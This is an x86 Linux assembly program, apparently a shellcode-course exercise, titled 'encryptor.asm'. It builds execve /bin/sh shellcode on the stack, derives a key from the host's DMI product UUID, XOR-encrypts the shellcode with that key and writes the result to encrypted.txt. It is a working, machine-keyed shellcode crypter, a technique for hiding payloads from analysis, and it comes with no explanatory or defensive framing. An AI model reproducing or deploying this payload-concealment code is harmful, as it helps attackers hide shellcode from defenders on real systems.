
;encryptor.asm

SECTION .data
	s1 db "wb",0
	s2: db "encrypted.txt",0
	s3: db "/sys/class/dmi/id/product_uuid",0

SECTION .text

global _start




_start:

	xor eax,eax
	xor ebx,ebx
	xor edx,edx
	xor ecx,ecx
	;mov ecx,49
	;mov eax,17H  
	;cpuid
	;mov ecx,ebx
	;add eax, ebx
	;add eax, ecx
	;add eax, edx


	;xor ebx,ebx
	;xor edx,edx
	;xor ecx,ecx

	push ebp
	mov ebp, esp
	sub    esp,0xb0
	mov    DWORD [ebp-0x4],0x0
	mov    DWORD [ebp-0x8],0x0
  	mov    DWORD [ebp-0x14],0x0
 	mov    DWORD [ebp-0x18],0x0
  	mov    DWORD [ebp-0xc],0x0
  	mov    DWORD [ebp-0x1c],0x0
  	mov    DWORD [ebp-0x20],0x41414141
 	mov    DWORD [ebp-0x24],0xab1d213
  	mov    DWORD [ebp-0x28],0x1
   	;mov    eax,DWORD [ebp-0x20]
   	;mov    DWORD [ebp-0x10],eax
 	mov    DWORD [ebp-0x42],0x6850c031
  	mov    DWORD [ebp-0x3e],0x68732f2f
  	mov    DWORD [ebp-0x3a],0x69622f68
  	mov    DWORD [ebp-0x36],0x50e3896e
  	mov    DWORD [ebp-0x32],0x8953e289
	mov    DWORD [ebp-0x2e],0xcd0bb0e1
  	mov    WORD [ebp-0x2a],0x80
  	mov    DWORD [ebp-0x8],0x0
  	
  	sub esp,40
  	
  	mov ebx, s3
	mov eax, 5
	mov ecx, 2
	int 0x80
  	
  	
  	mov ebx,eax
  	mov ecx,esp
  	mov edx,36
  	mov eax,3
  	int 0x80
  	
  	xor eax,eax
  	mov ebx, dword [esp]
  	add eax,ebx
  	mov ebx, dword [esp+4]
  	add eax,ebx
  	mov ebx, dword [esp+8]
  	add eax,ebx
  	mov ebx, dword [esp+12]
  	add eax,ebx
  	mov ebx, dword [esp+16]
  	add eax,ebx
  	mov ebx, dword [esp+20]
  	add eax,ebx
  	mov ebx, dword [esp+24]
  	add eax,ebx
  	mov ebx, dword [esp+28]
  	add eax,ebx
  	mov ebx, dword [esp+32]
  	add eax,ebx
  	
  	mov DWORD [ebp-0x10], eax
	
	loop1:
		mov    DWORD [ebp-0x18],0x80000000
       	mov    eax,DWORD [ebp-0x24]
      	imul   eax,DWORD [ebp-0x10]
       	mov    edx,eax
       	mov    eax,DWORD [ebp-0x28]
       	add    eax,edx
       	mov    ecx,DWORD [ebp-0x18]
     	mov    edx,0x0
       	div    ecx
       	mov    DWORD [ebp-0x10],edx
       	mov    eax,DWORD [ebp-0x10]
       	mov    DWORD [ebp-0xc],eax
      	
      	loop2:
			mov    eax,DWORD [ebp-0x4]
			lea    edx,[eax+0x1]
			mov    DWORD [ebp-0x4],edx
			mov    edx,DWORD [ebp-0xc]
			mov    ecx,edx
			sar    ecx,0x1f
			shr    ecx,0x1c
			add    edx,ecx
			and    edx,0xf
			sub    edx,ecx
			add    edx,0x23
			mov    BYTE [ebp+eax*1-0xa6],dl
			mov    eax,DWORD [ebp-0xc]
			lea    edx,[eax+0xf]
			test   eax,eax
			cmovs  eax,edx
			sar    eax,0x4
			mov    DWORD [ebp-0xc],eax
			cmp    DWORD [ebp-0xc],0x0
			jne    loop2
			
		add    DWORD [ebp-0x8],0x1
       	cmp    DWORD [ebp-0x8],0x9
		jle	   loop1
	
	mov    DWORD [ebp-0x4],0x0
	loop3:
		lea    edx,[ebp-0x42]
		mov    eax,DWORD [ebp-0x4]
		add    eax,edx
		movzx  edx,BYTE [eax]
		lea    ecx,[ebp-0xa6]
		mov    eax,DWORD [ebp-0x4]
		add    eax,ecx
		movzx  eax,BYTE [eax]
		xor    eax,edx
		lea    ecx,[ebp-0x42]
		mov    edx,DWORD [ebp-0x4]
		add    edx,ecx
		mov    BYTE [edx],al
		add    DWORD [ebp-0x4],0x1
		cmp    DWORD [ebp-0x4],0x18
		jle    loop3 
	

		xor ebx,ebx
		xor edx,edx
		xor ecx,ecx
		xor eax,eax

		mov ebx, s2
		mov eax, 5
		mov ecx, 2
		int 0x80

		mov ebx, eax
		lea ecx, [ebp-0x42]
		mov edx, 25
		xor eax,eax
		mov eax, 4
		int 0x80

		xor eax, eax
		mov al, 1      
		xor ebx,ebx
		int 0x80

